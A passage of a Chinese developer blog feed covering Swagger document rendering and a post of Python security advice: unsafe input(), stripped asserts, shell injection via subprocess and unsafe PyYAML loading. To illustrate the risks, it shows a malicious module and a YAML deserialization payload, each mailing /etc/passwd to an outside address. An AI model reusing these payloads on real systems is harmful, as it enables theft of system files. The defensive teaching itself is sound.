<td style="text-align:right">必填项。表示使用的swagger的版本，必须为2.0</td>
</tr>
<tr>
<td>info</td>
<td style="text-align:center"><a href="http://swagger.io/specification/#infoObject" target="_blank" rel="external">Info Object</a></td>
<td style="text-align:right">必填项。提供API的一些元数据描述</td>
</tr>
<tr>
<td>host</td>
<td style="text-align:center">string</td>
<td style="text-align:right">提供该API服务的主机名称或者IP，测试时 使用该地址进程测试。</td>
</tr>
<tr>
<td>basePath</td>
<td style="text-align:center">string</td>
<td style="text-align:right">API的基本路径,这是相对的host。 如果不包括,API是直属host。 必须以”/“开头</td>
</tr>
<tr>
<td>schemes</td>
<td style="text-align:center">[string]</td>
<td style="text-align:right">API的传输协议的列表。 在”http”,”https”,”ws”,”wss”其中选择</td>
</tr>
<tr>
<td>consumes</td>
<td style="text-align:center">[string]</td>
<td style="text-align:right">一个MIME类型的api可以使用列表。 值必须是所描述的Mime类型</td>
</tr>
<tr>
<td>produces</td>
<td style="text-align:center">[string]</td>
<td style="text-align:right">MIME类型的api可以产生的列表。   值必须是所描述的Mime类型</td>
</tr>
<tr>
<td>paths</td>
<td style="text-align:center"><a href="http://swagger.io/specification/#pathsObject" target="_blank" rel="external">路径对象</a></td>
<td style="text-align:right">必填项。可用的路径和操作的API</td>
</tr>
<tr>
<td>definitions</td>
<td style="text-align:center"><a href="http://swagger.io/specification/#definitionsObject" target="_blank" rel="external">定义对象</a></td>
<td style="text-align:right">一个对象数据类型定义</td>
</tr>
<tr>
<td>parameters</td>
<td style="text-align:center"><a href="http://swagger.io/specification/#parametersDefinitionsObject" target="_blank" rel="external">参数定义对象</a></td>
<td style="text-align:right">定义请求参数的对象</td>
</tr>
<tr>
<td>responses</td>
<td style="text-align:center"><a href="http://swagger.io/specification/#responsesDefinitionsObject" target="_blank" rel="external">反应定义对象</a></td>
<td style="text-align:right">定义请求响应对象</td>
</tr>
<tr>
<td>securityDefinitions</td>
<td style="text-align:center"><a href="http://swagger.io/specification/#securityDefinitionsObject" target="_blank" rel="external">安全定义对象</a></td>
<td style="text-align:right">安全方案定义规范,比如认证</td>
</tr>
<tr>
<td>security</td>
<td style="text-align:center"><a href="http://swagger.io/specification/#securityRequirementObject" target="_blank" rel="external">安全需求对象</a></td>
<td style="text-align:right">这里主要指使用哪种认证手段</td>
</tr>
<tr>
<td>tags</td>
<td style="text-align:center"><a href="http://swagger.io/specification/#tagObject" target="_blank" rel="external">标签对象</a></td>
<td style="text-align:right">没个RESTful中资源的标签，列表中的每个标记名称必须是唯一的</td>
</tr>
<tr>
<td>externalDocs</td>
<td style="text-align:center"><a href="http://swagger.io/specification/#externalDocumentationObject" target="_blank" rel="external">外部文档对象</a></td>
<td style="text-align:right">额外的外部文档, 指向外部url</td>
</tr>
</tbody>
</table>
<h2 id="渲染器-ui"><a href="#渲染器-ui" class="headerlink" title="渲染器(ui)"></a>渲染器(ui)</h2><p>swagger-ui的使用很简单<a href="http://swagger.io/docs/" target="_blank" rel="external">swager-ui官方文档</a></p>
<h3 id="HTML文档渲染"><a href="#HTML文档渲染" class="headerlink" title="HTML文档渲染"></a>HTML文档渲染</h3><p>渲染器使用官方的swagger-ui，这里我们需要一个web服务器，用来渲染我们刚才编辑完成的api 设计文档。这里一般使用node 的 express为web框架来做这个简单的web服务器</p>
<h3 id="PDF文档渲染"><a href="#PDF文档渲染" class="headerlink" title="PDF文档渲染"></a>PDF文档渲染</h3><p>将API设计文档渲染成PDF, 流程是这样: swagger.yaml —&gt; asciiDoc—&gt; pdf</p>
<ul>
<li><p>使用<a href="https://github.com/Swagger2Markup/swagger2markup" target="_blank" rel="external">swagger2markup</a>来生成asciiDoc格式的文档<br>下载swagger2markup工具,<a href="http://repo.springsource.org/libs-release-remote/io/github/swagger2markup/swagger2markup-cli/" target="_blank" rel="external">下载地址</a>,选择你想要的版本下载<br>使用工具生成asciiDoc, -i指定swagger.yaml的位置, -f指定输出文件名称：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -jar swagger2markup-cli-1.1.0.jar convert -i ~/PycharmProjects/doc/api_design/swagger.yaml <span class="_">-f</span> asiidoc/swagger</div></pre></td></tr></table></figure>
</li>
<li><p>使用<a href="http://asciidoctor.org/docs/convert-asciidoc-to-pdf/" target="_blank" rel="external">asciidoctor</a>来将asciiDoc换换成PDF<br>这是一个ruby写的工具，我本地不打算部署ruby环境，因此在找一个docker镜像：<code>madduci/docker-asciidoctor-pdf</code><br>由于访问dockerhub的镜像速度非常慢，因此我将该工具的使用说明复制了下来，<a href="https://store.docker.com/community/images/madduci/docker-asciidoctor-pdf" target="_blank" rel="external">镜像使用说明</a></p>
<blockquote>
<p>Docker Image exposing asciidoctor-pdf as entrypoint and /document as mounted volume where to build the file<br>To build your own documents as PDF, simply run the container as:<br>docker run –rm -v /path/to/your/document/folder/:/document/ madduci/docker-asciidoctor-pdf /document/your_document.adoc<br>If you want to use some custom styles, just run it as<br>docker run –rm -v /path/to/your/document/folder/:/document/ madduci/docker-asciidoctor-pdf -a pdf-stylesdir=/document/resources/themes -a pdf-style=your_style -a pdf-fontsdir=/document/resources/fonts /document/your_document.adoc<br>and it will generate the pdf in the mounted volume /document</p>
</blockquote>
<p>这工具在生成含有中文的pdf文档时有字体问题，因此我修改了字体为微软雅黑字体，以下是修改方法：</p>
<ol>
<li><p>添加雅黑字体到当前的Fonts文件夹下面,这里需要标准字体和粗体, 而默认提供的字体只有这些<a href="https://github.com/asciidoctor/asciidoctor-pdf/tree/master/data/fonts" target="_blank" rel="external">默认提供的字体</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">➜  asiidoc ls Fonts |grep -i &apos;yahei&apos;</div><div class="line">Microsoft Yahei.ttf</div><div class="line">yahei.ttf</div><div class="line">yahei_bold.ttf</div></pre></td></tr></table></figure>
</li>
<li><p>修改主题配置<code>default-theme.yml</code>的<code>Noto Serif</code>字段，使用该字体:<br>配置文件下载地址<a href="https://github.com/asciidoctor/asciidoctor-pdf/tree/master/data/themes" target="_blank" rel="external">默认配置文件下载地址</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Noto Serif:</div><div class="line">normal: yahei.ttf</div><div class="line">bold: yahei_bold.ttf</div><div class="line">italic: yahei.ttf</div><div class="line">bold_italic: yahei_bold.tt</div></pre></td></tr></table></figure>
</li>
</ol>
<p>最后把我们生成好的swagger.adoc, 主题配置文件,字体 放在一个目录下，挂载到docker里面去:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">➜  Downloads ls asiidoc</div><div class="line">Fonts  swagger.adoc themes</div><div class="line">docker run --rm -v $(<span class="built_in">pwd</span>)/asiidoc/:/document/ madduci/docker-asciidoctor-pdf  <span class="_">-a</span> pdf-fontsdir=/document/Fonts <span class="_">-a</span> pdf-stylesdir=/document/themes /document/swagger.adoc</div></pre></td></tr></table></figure>
<p>最后查看asiidoc下面就会有生成的pdf文件</p>
</li>
</ul>
<h2 id="代码生成器-codegen"><a href="#代码生成器-codegen" class="headerlink" title="代码生成器(codegen)"></a>代码生成器(codegen)</h2><p>swagger能提供服务端和客户端的代码生成功能,这个功能在swagger-editor上已经集成<br>生成server端代码：<br><img src="http://oiw1gzfww.bkt.clouddn.com/swagger_gen_server_code.png" alt=""><br>生成客户端代码：<br><img src="http://oiw1gzfww.bkt.clouddn.com/swagger_gen_client_code.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://oiw1gzfww.bkt.clouddn.com/swagger_example.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="程序设计" scheme="https://blog.yumaojun.net/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
      <category term="RESTful API" scheme="https://blog.yumaojun.net/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/RESTful-API/"/>
    
    
      <category term="swagger" scheme="https://blog.yumaojun.net/tags/swagger/"/>
    
  </entry>
  
  <entry>
    <title>使用Python中的一些安全建议</title>
    <link href="https://blog.yumaojun.net/2017/01/02/python-bestpractice/"/>
    <id>https://blog.yumaojun.net/2017/01/02/python-bestpractice/</id>
    <published>2017-01-02T04:46:29.000Z</published>
    <updated>2017-01-10T05:56:00.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://oiw1gzfww.bkt.clouddn.com/python_tips_.png" alt=""><br><a id="more"></a></p>
<p>由于Python简洁，优雅，开发效率高，渐渐在计算环境中无处不在。但是如果你不注意，容易编写出具有严重安全隐患的代码, 以下我整理的一些如何编写出安全代码的一些建议。</p>
<h2 id="input函数"><a href="#input函数" class="headerlink" title="input函数"></a>input函数</h2><p>在<code>Python 2</code>大量的内置功能集合中，<code>input</code>完全就是一个安全灾难。一旦调用它，从标准输入读入的任何东西都会被立即解析为Python代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">➜  ~ python2</div><div class="line">Python 2.7.12 (default, Dec  2 2016, 21:51:52)</div><div class="line">[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.42.1)] on darwin</div><div class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</div><div class="line">&gt;&gt;&gt; input()</div><div class="line">dir()</div><div class="line">[<span class="string">'__builtins__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>]</div><div class="line">&gt;&gt;&gt; input()</div><div class="line">__import__(<span class="string">'sys'</span>).exit()</div><div class="line">➜  ~</div></pre></td></tr></table></figure></p>
<p>显然，必须永远不使用<code>input</code>函数，除非脚本的标准输入中的数据是完全可信的。 <code>Python 2</code>文档建议将<code>raw_input</code>作为一个安全的替代品。在<code>Python 3</code>中，<code>input</code>函数等同于<code>raw_input</code>，从而一劳永逸地解决了这个隐患</p>
<h2 id="assert语句"><a href="#assert语句" class="headerlink" title="assert语句"></a>assert语句</h2><p>在 Python 应用中使用 assert 语句在不可能条件下捕获是一个编程习惯。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify_credentials</span><span class="params">(username, password)</span>:</span></div><div class="line">    <span class="keyword">assert</span> username <span class="keyword">and</span> password, <span class="string">'Credentials not supplied by caller'</span></div><div class="line">    ... authenticate possibly null user <span class="keyword">with</span> null password ...</div></pre></td></tr></table></figure></p>
<p>然而，在将源代码编译成优化的字节码时（例如， python - O ），Python 并不为 assert 语句生成任何指令。它默默地删除那些程序员写的让程序免受畸形数据攻击的代码，让应用暴露在攻击之中。该漏洞的根本原因在于 assert机制纯粹是为测试目的而设，正如在 C++ 中做的那样。程序员必须使用其他手段以保证数据一致性。</p>
<h2 id="不要使用is来比较int"><a href="#不要使用is来比较int" class="headerlink" title="不要使用is来比较int"></a>不要使用is来比较int</h2><p>在我们的印象里，int是不可变对象，我们来看看下面这个例子<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">257</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span class="number">257</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a <span class="keyword">is</span> b</div><div class="line"><span class="keyword">False</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a == b</div><div class="line"><span class="keyword">True</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">256</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span class="number">256</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a <span class="keyword">is</span> b</div><div class="line"><span class="keyword">True</span></div></pre></td></tr></table></figure></p>
<p>为了避免每次给经常使用到这部分整数分配一个新的内存，<code>Python</code>预先生成并缓存好这些常用整数(<code>[-5, 257)</code>)，这样的预处理可以加快程序运行时效率，更详细的了解会在以后的Python数据结构源码解读部分做介绍。<br>因此不要使用is比较整数大小，is是用于比较是否为同一对象的，is本身是不是用来干这件事的。</p>
<h2 id="float的舍入问题"><a href="#float的舍入问题" class="headerlink" title="float的舍入问题"></a>float的舍入问题</h2><p>因为十进制的小数并不能用二进制精确的表达出来, 在十进制中，进制的基数是10，而5正好是10的一半。 2的一半是多少？当然是1了。 所以，十进制的0.5就是二进制的0.1, 而对于二进制来说，只有0和1的变化，那么只有0.1和0.0,这样仅能精确表达十进制0.0和0.5,你以此类推，那么会发现一个结论：如果一个十进制数可以用二进制精确表示，那么它的最后一位肯定是5,所以只有以5结尾的小数才能被精确的计算<br>我们看看下面一个有趣的现象。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">In [<span class="number">1</span>]: <span class="number">0.1</span> + <span class="number">0.1</span></div><div class="line">Out[<span class="number">1</span>]: <span class="number">0.2</span></div><div class="line"></div><div class="line">In [<span class="number">2</span>]: <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span></div><div class="line">Out[<span class="number">2</span>]: <span class="number">0.30000000000000004</span></div><div class="line"></div><div class="line">In [<span class="number">3</span>]: <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span></div><div class="line">Out[<span class="number">3</span>]: <span class="number">0.4</span></div><div class="line"></div><div class="line">In [<span class="number">4</span>]: <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span></div><div class="line">Out[<span class="number">4</span>]: <span class="number">0.5</span></div><div class="line"></div><div class="line">In [<span class="number">5</span>]: <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span></div><div class="line">Out[<span class="number">5</span>]: <span class="number">0.6</span></div><div class="line"></div><div class="line">In [<span class="number">6</span>]: <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span></div><div class="line">Out[<span class="number">6</span>]: <span class="number">0.7</span></div><div class="line"></div><div class="line">In [<span class="number">7</span>]: <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span></div><div class="line">Out[<span class="number">7</span>]: <span class="number">0.7999999999999999</span></div><div class="line"></div><div class="line">In [<span class="number">8</span>]: <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span></div><div class="line">Out[<span class="number">8</span>]: <span class="number">0.8999999999999999</span></div><div class="line"></div><div class="line">In [<span class="number">9</span>]: <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span></div><div class="line">Out[<span class="number">9</span>]: <span class="number">0.9999999999999999</span></div></pre></td></tr></table></figure></p>
<p>我看到有位网友的提出的解决方案：</p>
<blockquote>
<p>我有一个观点，针对小数精度不够的问题（例如 0.1），软件可以人为的在数据最后一位补 5， 也就是 0.15，这样牺牲一位，但是可以保证数据精度，还原再把那个尾巴 5 去掉。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">In [<span class="number">40</span>]: <span class="number">0.4</span> + <span class="number">0.2</span></div><div class="line">Out[<span class="number">40</span>]: <span class="number">0.6000000000000001</span></div><div class="line"></div><div class="line">In [<span class="number">41</span>]: (<span class="number">0.45</span> + <span class="number">0.25</span>) - (<span class="number">0.05</span> + <span class="number">0.05</span>)</div><div class="line">Out[<span class="number">41</span>]: <span class="number">0.</span></div><div class="line"></div><div class="line">In [<span class="number">49</span>]: <span class="number">0.6</span> + <span class="number">0.3</span></div><div class="line">Out[<span class="number">49</span>]: <span class="number">0.8999999999999999</span></div><div class="line"></div><div class="line">In [<span class="number">50</span>]: <span class="number">0.65</span> + <span class="number">0.35</span> - (<span class="number">0.05</span> + <span class="number">0.05</span>)</div><div class="line">Out[<span class="number">50</span>]: <span class="number">0.9</span></div></pre></td></tr></table></figure></p>
</blockquote>
<p>最好的处理措施是只要有可能，就坚持整数运算。次好的处理措施可能是使用decimal模块，它试图保护用户免受琐碎细节和危险缺陷之苦。</p>
<h2 id="私有属性"><a href="#私有属性" class="headerlink" title="私有属性"></a>私有属性</h2><p>Python 不支持对象属性隐藏, 及时你使用__来保护你的变量(private),在内部，python也仅仅是将其别名了而已，而这个别名的动作是在解释器调用type来创建class时执行的的。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">In [<span class="number">54</span>]: <span class="class"><span class="keyword">class</span> <span class="title">X</span><span class="params">(object)</span>:</span></div><div class="line">    ...:     <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">    ...:         self.__private = <span class="number">1</span></div><div class="line">    ...:     <span class="function"><span class="keyword">def</span> <span class="title">get_private</span><span class="params">(self)</span>:</span></div><div class="line">    ...:         <span class="keyword">return</span> self.__private</div><div class="line">    ...:     <span class="function"><span class="keyword">def</span> <span class="title">has_private</span><span class="params">(self)</span>:</span></div><div class="line">    ...:         <span class="keyword">return</span> hasattr(self, <span class="string">'__private'</span>)</div><div class="line">    ...:</div><div class="line"></div><div class="line">In [<span class="number">55</span>]: x = X()</div><div class="line"></div><div class="line">In [<span class="number">56</span>]: x.has_private()</div><div class="line">Out[<span class="number">56</span>]: <span class="keyword">False</span></div><div class="line"></div><div class="line">In [<span class="number">57</span>]: x.get_private()</div><div class="line">Out[<span class="number">57</span>]: <span class="number">1</span></div><div class="line"></div><div class="line">In [<span class="number">58</span>]: x.__private = <span class="number">2</span></div><div class="line"></div><div class="line">In [<span class="number">59</span>]: x.__private</div><div class="line">Out[<span class="number">59</span>]: <span class="number">2</span></div><div class="line"></div><div class="line">In [<span class="number">60</span>]: hasattr(x, <span class="string">'__private'</span>)</div><div class="line">Out[<span class="number">60</span>]: <span class="keyword">True</span></div><div class="line"></div><div class="line">In [<span class="number">61</span>]: x._X__private</div><div class="line">Out[<span class="number">61</span>]: <span class="number">1</span></div></pre></td></tr></table></figure></p>
<p>然后如果我们后面动态添加的属性，那么是不会有这种保护的(无转换发生)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">In [<span class="number">62</span>]: x.__private</div><div class="line">Out[<span class="number">62</span>]: <span class="number">2</span></div><div class="line"></div><div class="line">In [<span class="number">63</span>]: hasattr(x, <span class="string">'__private'</span>)</div><div class="line">Out[<span class="number">63</span>]: <span class="keyword">True</span></div></pre></td></tr></table></figure></p>
<p>如果程序员依赖于双下划线属性来在他们的代码中做出重要决定，而不关注私有属性的不对称行为，那么这些小技巧会变成安全漏洞</p>
<h2 id="模块执行"><a href="#模块执行" class="headerlink" title="模块执行"></a>模块执行</h2><p>语句实际上会导致导入的模块中的代码的执行，这一事实并不明显。这就是为什么甚至导入不可信模块或包是有风险的。导入像这样的简单模块可能会导致不愉快的结果：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$ cat malicious.py</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> sys</div><div class="line">os.system(<span class="string">'cat /etc/passwd | mail attacker@blackhat.com'</span>)</div><div class="line"><span class="keyword">del</span> sys.modules[<span class="string">'malicious'</span>]  <span class="comment"># pretend it's not imported</span></div><div class="line">$ python</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> malicious</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>dir(malicious)</div><div class="line">Traceback(most recent call last):</div><div class="line">NameError:</div><div class="line">    name <span class="string">'malicious'</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</div></pre></td></tr></table></figure></p>
<h2 id="猴子补丁"><a href="#猴子补丁" class="headerlink" title="猴子补丁"></a>猴子补丁</h2><p>运行时修改 Python 对象属性的过程称之为猴子补丁 ( monkey patching)。作为动态语言， Python 完全支持运行时程序自省和代码突变。一旦以某种方式导入了一个恶意模块，那么任何现有的可变对象可被不知不觉地在没有程序员同意的情况下被打猴子补丁。<br>攻击者可以利用 Python 垃圾回收器 ( gc.get_objects())来掌握现有的所有对象，并黑进它们中任意一个。</p>
<p>Python 对象的类型是由 __class__ 属性决定的。邪恶的攻击者可以通过依靠改变活动对象的类型来令人绝望地把事情搞砸：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">X</span><span class="params">(object)</span>:</span></div><div class="line">        <span class="keyword">pass</span></div><div class="line">...</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Y</span><span class="params">(object)</span>:</span></div><div class="line">        <span class="keyword">pass</span></div><div class="line">...</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>x_obj = X()</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>x_obj</div><div class="line">&lt;__main__.X object at <span class="number">0x7f62dbe5e010</span> &gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>isinstance(x_obj, X)</div><div class="line"><span class="keyword">True</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>x_obj.__class__ = Y</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>x_obj</div><div class="line">&lt;__main__.Y object at <span class="number">0x7f62dbe5d350</span> &gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>isinstance(x_obj, X)</div><div class="line"><span class="keyword">False</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>isinstance(x_obj, Y)</div><div class="line"><span class="keyword">True</span></div><div class="line">&gt;&gt;&gt;</div></pre></td></tr></table></figure></p>
<p>对抗恶意猴子补丁的唯一处理措施是保证导入的 Python 模块的真实性和完整性, 一个简单的方法是使用__slot__来保护自己的类不被注入攻击,但是这又丧失了一些灵活性。</p>
<h2 id="通过subprocess进行shell注入"><a href="#通过subprocess进行shell注入" class="headerlink" title="通过subprocess进行shell注入"></a>通过subprocess进行shell注入</h2><p>以胶水语言著称，对Python脚本来说，通过让操作系统来执行它们，可能还提供额外的参数，来委派系统管理任务给其他程序，是非常常见的。subprocess模块为这样的任务提供了易于使用和相当高层次的服务。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> subprocess <span class="keyword">import</span> call</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>call(<span class="string">'date'</span>)</div><div class="line"><span class="number">2017</span>年 <span class="number">1</span>月<span class="number">10</span>日 星期二 <span class="number">13</span>时<span class="number">11</span>分<span class="number">53</span>秒 CST</div><div class="line"><span class="number">0</span></div><div class="line">&gt;&gt;&gt;</div></pre></td></tr></table></figure></p>
<p>但有一个陷阱！要利用<code>UNIX shell</code>服务，例如命令行参数扩展，call函数的<code>shell</code>关键字参数应该设置为<code>True</code>。然后原样传递call函数的第一个参数给系统<code>shell</code>，用以进一步的解析。一旦无效的用户输入到达call函数(或者其他在 subprocess 模块中实现的函数)，那么就会开放一个口给底层系统资源。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>call(<span class="string">'cut -d: -f1 /etc/passwd'</span>, shell=<span class="keyword">True</span>)</div><div class="line">nobody</div><div class="line">root</div><div class="line">daemon</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>显然，将<code>shell</code>关键字保持默认值<code>False</code>，并且提供命令及其参数的数组给<code>subprocess</code>函数，不要为外部命令执行调用<code>UNIX shell</code>，这样会安全得多。在这第二次调用格式，命令或者它的参数都不会被<code>shell</code>解析或展开。<br>如果应用的本质决定了使用<code>UNIX shell</code>服务，那么清理一切到 <code>subprocess</code>的参数，确保没有不想要的shell功能可以被恶意用户利用，这完全是重要的。在更新的Python版本中，可以用标准库的<code>shlex.quote</code>函数来进行shell转义。</p>
<h2 id="序列化-pyYAML"><a href="#序列化-pyYAML" class="headerlink" title="序列化-pyYAML"></a>序列化-pyYAML</h2><p>作为一个流行的配置文件格式，<code>YAML</code>不一定被认为是一个能够诱使反序列化器执行任意代码的强大的序列化协议。让它甚至更危险的是，事实上<code>Python</code>的<code>YAML</code>默认实现—-<code>PyYAML</code>让反序列化看起来非常无辜：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>dangerous_input = <span class="string">"""</span></div><div class="line"><span class="meta">... </span>some_option: !!python/object/apply:subprocess.call</div><div class="line"><span class="meta">... </span>  args: [cat /etc/passwd | mail 719118794@qq.com]</div><div class="line"><span class="meta">... </span>  kwds: &#123;shell: true&#125;</div><div class="line"><span class="meta">... </span>"""</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>yaml.load(dangerous_input)</div><div class="line">&#123;<span class="string">'some_option'</span>: <span class="number">0</span>&#125;</div></pre></td></tr></table></figure></p>
<p>而/etc/passwd已经被窃取了。一个建议的解决方法是总是使用 yaml.safe_load来处理那些你不信任的YAML序列化。尽管如此，目前的PyYAML默认感觉有些驱使人考虑其他倾向于为相似的目的使用 dump/ load函数名（但是以一种安全的方式的序列化库</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://oiw1gzfww.bkt.clouddn.com/python_tips_.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="开发语言" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/"/>
    
      <category term="Python" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/Python/"/>
    
    
      <category term="python_tips" scheme="https://blog.yumaojun.net/tags/python-tips/"/>
    
  </entry>
  
  <entry>
    <title>使用VSCode快速搭建NodeJS开发环境</title>
    <link href="https://blog.yumaojun.net/2017/01/01/nodejs-vscode/"/>
    <id>https://blog.yumaojun.net/2017/01/01/nodejs-vscode/</id>
    <published>2017-01-01T14:42:02.000Z</published>
    <updated>2017-01-06T06:18:03.000Z</updated>
    
